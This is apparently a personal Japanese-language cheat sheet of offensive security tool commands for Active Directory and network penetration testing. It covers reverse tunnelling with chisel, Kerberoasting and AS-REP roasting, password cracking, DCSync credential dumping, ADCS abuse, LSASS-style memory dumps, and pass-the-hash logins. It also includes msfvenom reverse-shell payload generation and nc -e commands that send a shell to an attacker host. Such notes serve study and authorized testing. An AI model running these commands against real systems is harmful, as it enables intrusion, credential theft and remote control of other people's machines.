# chisel
ネットワークトンネリングツールであり、リモートポートフォワーディングやリバーストンネリングを実現するために使用されるツール。
## Command
サーバー側の3306にアクセスすると、Chiselトンネルを通じてクライアント側の3306にアクセスする。
```bash
# サーバー側
./chisel server -p 8888 -reverse
# クライアント側
./chisel client <Server IP>:8888 R:3306:127.0.0.1:3306 &
```

# GetUserSPNs
サービスアカウントのパスワードハッシュを、ドメイン全体から抜き出すためのツール。
## Kerberoasting
```
sudo ntpdate <Target> # 時刻同期
impacket-GetUserSPNs -dc-ip <Target> <Domain>/<User>:<Password> -request -outputfile <File> -save 
```

# gpp-decrypt
GPPに含まれるcpasswordを復号するツール。
```bash
gpp-decrypt <cpassword>
```

# hashcat
パスワードハッシュを高速に解析・復号するツール。
```bash
hashcat -m 3200 <File> <Wordlist> # bcrypt
hashcat -a 0 -m 5200 <File> <Wordlist> # psafe3
hashcat -a 0 -m 18200 <File> <Wordlist>
```

# hashid
入力されたハッシュ値が、どのアルゴリズムで生成されたものかを特定するためのツール。
```bash
hashid '<ハッシュ>'
```

# John The Ripper
主にパスワードクラッキングに使用されるツール。
## Command
```bash
john <File> -w=<Wordlist> # 基本
--format=<Format> # フォーマット
 raw-md5 # md5ハッシュ
 md5crypt # $1$から始まるmd5
--fork=4 # 4スレッドで実行
```
## Conversion
```bash
ssh2john <ssh_key> > <output> # ssh2ファイルをハッシュに変換
zip2john <Zip> > <ouput> # ロックされているzipファイルをハッシュに変換
keepass2john <keepass> > <output> # ロックされているkeepassファイルをハッシュに変換
```

# secretsdump
認証情報のダンプツール。
```bash
impacket-secretsdump.py -sam <SAM> -system <SYSTEM> local # SAMとSYSTEMレジストリから認証情報をダンプ
impacket-secretsdump.py <Domain>/<User>@<Target> # DCSync
impacket-secretsdump.py -just-dc <Domain>/<User>@<Target> # DCSync
```

# bloodhound
Active Directory内の権限関係を可視化するツール。
```bash
bloodhound-python -d <Domain> -u <User> -p <Password> -ns <DNS IP> -c All # 認証済みユーザーを使用してjsonファイルを生成。このファイルをブラウザ経由でGUIにアップロードする。
bloodhound # 起動 8080ポートを使用
```

# Certipy
ADCSの脆弱性を調査、列挙、および悪用するために設計されたツール
```bash
certipy-ad find -u <User>@<Target> -hashes :<NTLM hash> -stdout -vulnerable
certipy-ad find -u '<User>@<Target>' -p '<password>' -target <Target> -dc-ip <Target> -stdout -vulnerable
```

# Procdump
Sysinternalsツールの一つでプロセスのメモリの中身を、ダンプファイルとして書き出すためのツール。
```bash
procdump.exe -ma <pid> <output>.dmp -accepteula
```

# msfvenom
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<port> -f <extension> -o <File>
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR IP> LPORT=<port> -f <extension> -o <File>
```

# responder
Windowsの認証プロトコル（NTLM/SMB/LLMNR/mDNSなど）の脆弱性を悪用し、ネットワーク上で送信される認証情報をキャプチャするために使われるツール。
```bash
sudo responder -I <Interface>
```

# psexec
MicrosoftのSysinternalsが提供するPsExecの機能を、Pythonのライブラリを使って実装したツール。
Administratorの有効なパスワードが手に入れば、システムはそれが正規の管理者によるリモート操作であると認識し、アクセスを許可する。   
SMB(445)が有効であればWinRMが有効でなくても使用できることがある。
```bash
impacket-psexec 'administrator:<Password>@<Target>'
impacket-psexec administrator:'<Password>'@<Target>
impacket-psexec administrator@<Target> -hashes <NTLM hash>
```

# evil-winrm
LinuxからリモートのWindowsマシンに対しWindows Remote Managementプロトコル経由でアクセスするツール。
```bash
evil-winrm -i <Target> -u <User> -p '<Password>' # パスワードで接続
evil-winrm -i <Target> -u <User> -H '<NTLM hash>' # NTハッシュで接続
```

# nc
TCPやUDPなどのネットワーク接続を、コマンドラインを通じて読み書きするために設計されたツール
```powershell
nc.exe <Target> <port> -e cmd.exe
nc.exe <Target> <port> -e bash
```

# crackmapexec
ネットワーク上のホストを効率的に列挙したり、ブルートフォースを行うツール。
```bash
crackmapexec <Protocol> <Target> -u <Userlist> -p <Passwordlist> # プロトコルに対してユーザーリストとパスワードリストからログイン試行する
crackmapexec <Protocol> <Target> -u <User> -p <Password> # 単一のユーザーとパスワードでログイン試行する
--rid-brute # RID列挙
--users # ユーザー列挙
-H <ハッシュ> # NTハッシュを使用してログイン試行
```

# ffuf
ディレクトリ列挙ツール。
```bash
ffuf -u <URL>/FUZZ -w <Wordlist> # ディレクトリ
ffuf -u <URL> -H "Host: FUZZ.<Domain>" -w <Wordlist>
-mc 200,301 # 200, 301のステータスコードのみ出力
-fc 403 # 403を出力しない
-fs 1234 # ページサイズの除外
-H "Name: val" # ヘッダーの指定
-t 100 # スレッド数
-recursion # 回帰探索
```

# gobuster
ディレクトリ列挙ツール。
```bash
gobuster dir -u <Target> -w <Wordlist> # ワードリストに該当するURLを検索
gobuster vhost -u <Target> -w <Wordlist> --append-domain # サブドメインを検索
-k # 証明書チェックをスキップ
-t <Thread> # スレッド数を指定
-b "<Status>" # 指定したステータスコードを除外(vhostでは使えない)
-s "<Status>" # 指定したステータスコードのみを表示(vhostでは使えない)
--exclude-length <レスポンスの長さ> # 指定したレスポンスの長さを除外
--useragent "<任意>" # ユーザーエージェントを偽装
-x <Extension> # 指定した拡張子を検索
```

## ffuf, gobusterで使用するファイルパス(kali linux)
```bash
# ディレクトリ検索
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
/usr/share/wordlists/dirb/big.txt
# サブドメイン検索
/usr/share/seclists/Discovery/DNS/subdomains-<ワード数>.txt
```

# GetNPUsers
AS-REP Roastingを自動で実行するツール。
## AS-REP Roasting
ドメインコントローラーに対して事前認証を必要としないユーザーのTGTの要求をし、パスワードハッシュを抜き出す攻撃。
```bash
impacket-GetNPUsers <Domain>/<User> -no-pass -dc-ip <Target> # AS-REP Roasting
impacket-GetNPUsers <Domain>/ -no-pass -usersflie <Userlist> -dc-ip <Target> # ユーザーリストの名前でAS-REP Roasting
# AS-REP
# $krb5asrep$<Encryption type>$<User>@<Domain>:<salt>$<ユーザーのパスワードハッシュで暗号化された情報>
# hashcat -m 18200
```

# ldapsearch
LDAPサーバーに対して検索クエリを発行し、情報を取得するためのコマンドラインツール。
## Command
```bash
ldapsearch -H ldap://<Target> -x -b "dc=<Domain>" # 匿名バインド
ldapsearch -H ldap://<Target> -x -b "dc=<Domain>" -s sub "*" | grep -i lock # アカウントロックポリシー確認
ldapsearch -H ldap://<Target> -D <User>@<Domain> -b "dc=<Domain>" -w '<Password>' "*" # 認証ありバインド
```

# lookupsid
msrpc経由でSIDをブルートフォースし、ユーザー名やグループを列挙するツール。  
## Command
```bash
impacket-lookupsid <User>@<Target> -no-pass
impacket-lookupsid <User>@<Target> -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt # SidTypeUserだけを抜き出し、users.txtに保存。
impacket-lookupsid <User>:<Password>@<Target> # 認証あり
```

# nikto
Webサーバーに存在する脆弱性、設定ミス、古いソフトウェアなどを検出するための脆弱性スキャナーツール。
## Command
```bash
nikto -h <Target> -p <Port>
```

# Nmap
ターゲット端末上で実行されているソフトウェアの名称、バージョン、使用しているポートなどを特定することができるオープンソースのコマンドラインツール。
## Command
```bash
nmap <Options> <Target>
```
## Options
```bash
-p 80 # 80番ポートのスキャン
-p- # すべてのポートのスキャン
-v # スキャン中に詳細な情報を表示
-O # OSの特定
-sC # 脆弱性の基本的なチェック
-sV # サービスとそのバージョンの特定
-sS # 完全な接続を確立しないSYNスキャン
-sU # UDPポートのスキャン
-Pn # pingを行わないスキャン
--min-rate=5000 # 1秒間に最低5,000パケットを送信するスキャン
-T4 高速スキャン
```

# smbclient
LinuxからSMB共有にアクセスするためのコマンドラインツール
## Command
```bash
smbclient //<Target>/<Share> -N # 匿名接続
smbclient -L //<Target> -N # 匿名接続で共有フォルダを表示
smbclient //<Target>/<Share -c <Command> # 匿名接続と同時にコマンドを実行
smbclient //<Target>/<Share> -U <User> # ユーザーを指定して接続
smbclient -k //<Target>/<Share> # Kerberos認証を使用して接続
# 接続後
get <File> # ファイルをダウンロード
prompt OFF # 警告などの確認メッセージをオフにする
recurse ON # ダウンロードする時などで再帰をオンにする
mget * # すべてのファイルをダウンロード
```

# smbmap
ネットワーク上のSMB/CIFS共有を探索するツール。
## Command
```bash
smbmap -H <Target> -u guest -p "" # 匿名アクセス
smbmap -H <Target> -u <User> -p "<Password>" # 認証ユーザーでアクセス
smbmap -H <Target> -u <User> -p "<Password>" -r <Share> # 認証ユーザーで共有フォルダ内にアクセス
```

# username-anarchy
名と姓から、その組織が使っていそうなユーザー名のパターンを全自動で生成するツール。

## Command
```bash
username-anarchy --input-file unused.txt --select-format first, flast, first.last, firstl > used.txt

# unused.txt
# Taro Tanaka

# used.txt
# taro
# taro.tanaka
# tarot
# ttanaka
```

# windapsearch
Windowsドメイン内のユーザー、グループ、コンピュータ情報をLDAPクエリを使って列挙するツール。
## Command
```bash
windapsearch -d <Domain> --dc-ip <Target> -U # 匿名バインド
windapsearch -d <Domain> --dc-ip <Target> -U --custom "classObject=*"
windapsearch -d <Domain> --dc-ip <Target> -U --custom "objectClass=*"
windapsearch -d <Domain> --dc-ip <Target> -U --admin-objects
windapsearch -m "Remote Management Users" -d<Domain> --dc-ip <Target> -U # WinRMグループ検索
windapsearch -d <Domain> --dc-ip <Target> -U --full
windapsearch --admin-objects -d <Domain> --dc-ip <Target> -u '<User>' -p '<Password>' # 認証ありバインド
windapsearch -m "Remote Management Users" -d <Domain> --dc-ip <Target> -u '<User>' -p '<Password>'
-U # 匿名バインド
-u # ユーザー名
-p # パスワード
```
